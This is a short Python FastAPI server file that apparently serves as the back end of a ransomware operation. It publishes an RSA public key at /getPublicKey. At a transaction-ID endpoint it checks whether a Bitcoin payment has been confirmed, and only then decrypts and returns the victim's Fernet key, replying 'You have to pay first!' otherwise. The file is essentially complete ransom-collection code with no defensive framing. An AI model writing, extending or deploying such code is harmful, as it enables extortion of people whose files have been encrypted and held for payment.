from fastapi import FastAPI, Request
import backend_crypto
import backend_bitcoin
import uvicorn

app = FastAPI()

# backend_crypto.generate_keys()
backend_crypto.read_keys()

@app.post("/{transation_id}")
async def decript_fernet_key(request: Request):
    fail_message = {'failed': 'You have to pay first! Wait till transaction confirmed!'}

    try:
        is_paid = await backend_bitcoin.was_payment_made(request.path_params['transation_id'])
        if not is_paid:
            return {'failed': 'You have to pay first! Wait till transaction confirmed!'}

        key: bytes = await request.body()
        return backend_crypto.decript_fernet_key(key)

    except Exception:
        return fail_message


#ben
@app.get("/getPublicKey")
async def get_public_key():
    
    try:
        public_file = open("public.pem","r")
        public_key = public_file.readlines()[0]
        public_file.close()
        return public_key
    except Exception as e:
        print(e)
        return {'failed':'server_problem'}
    
    

if __name__ == "__main__":
    #uvicorn.run(app, host="127.0.0.1", port=8075)
    uvicorn.run("main:app", port=443, host='127.0.0.1', reload = True)